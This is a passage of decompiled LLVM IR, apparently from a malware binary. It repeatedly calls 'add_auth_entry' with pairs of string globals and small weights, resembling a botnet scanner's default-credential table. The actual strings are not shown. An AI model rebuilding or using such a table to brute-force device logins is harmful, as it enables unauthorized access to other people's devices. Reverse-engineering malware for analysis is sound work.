  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18154.164 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d830 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18154.164 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18264.226 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d840 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18264.226 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182b4.242 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_d850 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_182b4.242 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18188.178 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d860 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([5 x i8]* @global_var_18188.178 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_181c8.192 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_d870 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_181c8.192 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1814c.244 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d880 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([5 x i8]* @global_var_1814c.244 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182c0.246 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_d890 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_182c0.246 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_182cc.248 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d8a0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([6 x i8]* @global_var_182cc.248 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_182d4.250 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d8b0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([4 x i8]* @global_var_182d4.250 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182d8.252 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d8c0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_182d8.252 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182e0.254 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_d8d0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_182e0.254 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_182ec.256 to i32), i32* %r1.global-to-local, align 4
  %v0_d8dc = load i32, i32* @r4, align 4
  store i32 %v0_d8dc, i32* %r2.global-to-local, align 4
  %v5_d8e0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_182ec.256 to i32), i32 %v0_d8dc)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_182f4.258 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_d8f0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([9 x i8]* @global_var_182f4.258 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18300.260 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_d900 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18300.260 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18308.262 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d910 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18308.262 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18310.264 to i32), i32* %r1.global-to-local, align 4
  %v0_d91c = load i32, i32* @r4, align 4
  store i32 %v0_d91c, i32* %r2.global-to-local, align 4
  %v4_d920 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18310.264 to i32), i32 %v0_d91c)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18318.266 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d930 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18318.266 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18320.268 to i32), i32* %r1.global-to-local, align 4
  %v0_d93c = load i32, i32* @r4, align 4
  store i32 %v0_d93c, i32* %r2.global-to-local, align 4
  %v5_d940 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_18320.268 to i32), i32 %v0_d93c)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18328.270 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_d950 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([8 x i8]* @global_var_18328.270 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18330.272 to i32), i32* %r1.global-to-local, align 4
  %v0_d95c = load i32, i32* @r4, align 4
  store i32 %v0_d95c, i32* %r2.global-to-local, align 4
  %v4_d960 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18330.272 to i32), i32 %v0_d95c)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_181d4.196 to i32), i32* %r1.global-to-local, align 4
  %v0_d96c = load i32, i32* @r4, align 4
  store i32 %v0_d96c, i32* %r2.global-to-local, align 4
  %v5_d970 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_181d4.196 to i32), i32 %v0_d96c)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18338.274 to i32), i32* %r1.global-to-local, align 4
  %v0_d97c = load i32, i32* @r4, align 4
  store i32 %v0_d97c, i32* %r2.global-to-local, align 4
  %v4_d980 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18338.274 to i32), i32 %v0_d97c)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18340.276 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_d990 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_18340.276 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18348.278 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_d9a0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([9 x i8]* @global_var_18348.278 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18354.280 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18354.280 to i32), i32* %r1.global-to-local, align 4
  %v5_d9b0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18354.280 to i32), i32 ptrtoint ([6 x i8]* @global_var_18354.280 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1814c.244 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1814c.244 to i32), i32* %r1.global-to-local, align 4
  %v5_d9c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1814c.244 to i32), i32 ptrtoint ([5 x i8]* @global_var_1814c.244 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1814c.244 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d9d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1814c.244 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1844c.282 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d9e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_1844c.282 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1835c.284 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_d9f0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_1835c.284 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18364.286 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_da00 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18364.286 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18364.286 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18364.286 to i32), i32* %r1.global-to-local, align 4
  %v5_da10 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18364.286 to i32), i32 ptrtoint ([8 x i8]* @global_var_18364.286 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_1836c.288 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_da20 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1836c.288 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 3)
  store i32 ptrtoint ([8 x i8]* @global_var_18370.290 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18378.292 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_da30 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18370.290 to i32), i32 ptrtoint ([7 x i8]* @global_var_18378.292 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_18380.294 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18380.294 to i32), i32* %r1.global-to-local, align 4
  %v5_da40 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_18380.294 to i32), i32 ptrtoint ([4 x i8]* @global_var_18380.294 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18384.296 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_da50 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18384.296 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18390.298 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_da60 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_18390.298 to i32), i32 4)
  store i32 ptrtoint ([7 x i8]* @global_var_18398.300 to i32), i32* %r0.global-to-local, align 4
  %v0_da68 = load i32, i32* @r4, align 4
  store i32 %v0_da68, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18398.300 to i32), i32* %r1.global-to-local, align 4
  %v5_da70 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_18398.300 to i32), i32 ptrtoint ([7 x i8]* @global_var_18398.300 to i32), i32 %v0_da68)
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18398.300 to i32), i32* %r1.global-to-local, align 4
  %v0_da7c = load i32, i32* @r4, align 4
  store i32 %v0_da7c, i32* %r2.global-to-local, align 4
  %v4_da80 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 ptrtoint ([7 x i8]* @global_var_18398.300 to i32), i32 %v0_da7c)
  store i32 ptrtoint (i32* @global_var_183a0.302 to i32), i32* %r0.global-to-local, align 4
  %v0_da88 = load i32, i32* @r4, align 4
  store i32 %v0_da88, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_183a0.302 to i32), i32* %r1.global-to-local, align 4
  %v3_da90 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_183a0.302 to i32), i32 ptrtoint (i32* @global_var_183a0.302 to i32), i32 %v0_da88)
  store i32 ptrtoint ([6 x i8]* @global_var_183a8.304 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18140.160 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_daa0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_183a8.304 to i32), i32 ptrtoint ([8 x i8]* @global_var_18140.160 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_183b0.306 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_dab0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_183b0.306 to i32), i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_183b0.306 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18188.178 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_dac0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_183b0.306 to i32), i32 ptrtoint ([5 x i8]* @global_var_18188.178 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_183b0.306 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_dad0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_183b0.306 to i32), i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 5)
  store i32 ptrtoint (i32* @global_var_183b8.308 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v3_dae0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_183b8.308 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 5)
  store i32 ptrtoint ([9 x i8]* @global_var_183c0.310 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_183cc.312 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_daf0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_183c0.310 to i32), i32 ptrtoint ([7 x i8]* @global_var_183cc.312 to i32), i32 8)
  store i32 ptrtoint ([8 x i8]* @global_var_183d4.314 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_183d4.314 to i32), i32* %r1.global-to-local, align 4
  %v5_db00 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_183d4.314 to i32), i32 ptrtoint ([8 x i8]* @global_var_183d4.314 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_183dc.316 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_183dc.316 to i32), i32* %r1.global-to-local, align 4
  %v5_db10 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_183dc.316 to i32), i32 ptrtoint ([7 x i8]* @global_var_183dc.316 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_183dc.316 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_183e4.318 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_db20 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_183dc.316 to i32), i32 ptrtoint ([8 x i8]* @global_var_183e4.318 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_183ec.320 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_183f4.322 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_db30 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_183ec.320 to i32), i32 ptrtoint ([10 x i8]* @global_var_183f4.322 to i32), i32 9)
  store i32 ptrtoint ([6 x i8]* @global_var_183ec.320 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18340.276 to i32), i32* %r1.global-to-local, align 4
  %v0_db3c = load i32, i32* @r4, align 4
  store i32 %v0_db3c, i32* %r2.global-to-local, align 4
  %v5_db40 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_183ec.320 to i32), i32 ptrtoint ([7 x i8]* @global_var_18340.276 to i32), i32 %v0_db3c)
  store i32 ptrtoint ([5 x i8]* @global_var_18400.324 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18400.324 to i32), i32* %r1.global-to-local, align 4
  %v5_db50 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18400.324 to i32), i32 ptrtoint ([5 x i8]* @global_var_18400.324 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18408.326 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18410.328 to i32), i32* %r1.global-to-local, align 4
  %v0_db5c = load i32, i32* @r4, align 4
  store i32 %v0_db5c, i32* %r2.global-to-local, align 4
  %v5_db60 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18408.326 to i32), i32 ptrtoint ([7 x i8]* @global_var_18410.328 to i32), i32 %v0_db5c)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18410.328 to i32), i32* %r1.global-to-local, align 4
  %v0_db6c = load i32, i32* @r4, align 4
  store i32 %v0_db6c, i32* %r2.global-to-local, align 4
  %v5_db70 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_18410.328 to i32), i32 %v0_db6c)
  store i32 ptrtoint ([3 x i8]* @global_var_183e0.330 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18418.332 to i32), i32* %r1.global-to-local, align 4
  %v0_db7c = load i32, i32* @r4, align 4
  store i32 %v0_db7c, i32* %r2.global-to-local, align 4
  %v5_db80 = call i32 @add_auth_entry(i32 ptrtoint ([3 x i8]* @global_var_183e0.330 to i32), i32 ptrtoint ([7 x i8]* @global_var_18418.332 to i32), i32 %v0_db7c)
  store i32 ptrtoint ([7 x i8]* @global_var_18418.332 to i32), i32* %r0.global-to-local, align 4
  %v0_db88 = load i32, i32* @r4, align 4
  store i32 %v0_db88, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18418.332 to i32), i32* %r1.global-to-local, align 4
  %v5_db90 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_18418.332 to i32), i32 ptrtoint ([7 x i8]* @global_var_18418.332 to i32), i32 %v0_db88)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18420.334 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_dba0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_18420.334 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18420.334 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_dbb0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18420.334 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1842c.336 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_dbc0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_1842c.336 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18434.338 to i32), i32* %r1.global-to-local, align 4
  %v0_dbcc = load i32, i32* @r4, align 4
  store i32 %v0_dbcc, i32* %r2.global-to-local, align 4
  %v5_dbd0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([7 x i8]* @global_var_18434.338 to i32), i32 %v0_dbcc)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1843c.340 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_dbe0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_1843c.340 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18448.342 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_dbf0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18448.342 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18450.344 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_dc00 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18450.344 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1845c.346 to i32), i32* %r1.global-to-local, align 4
  %v0_dc0c = load i32, i32* @r4, align 4
  store i32 %v0_dc0c, i32* %r2.global-to-local, align 4
  %v4_dc10 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_1845c.346 to i32), i32 %v0_dc0c)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18464.348 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_dc20 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18464.348 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18470.350 to i32), i32* %r1.global-to-local, align 4
  %v0_dc2c = load i32, i32* @r4, align 4
  store i32 %v0_dc2c, i32* %r2.global-to-local, align 4
  %v4_dc30 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18470.350 to i32), i32 %v0_dc2c)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18478.352 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_dc40 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18478.352 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18480.354 to i32), i32* %r1.global-to-local, align 4
  %v0_dc4c = load i32, i32* @r4, align 4
  store i32 %v0_dc4c, i32* %r2.global-to-local, align 4
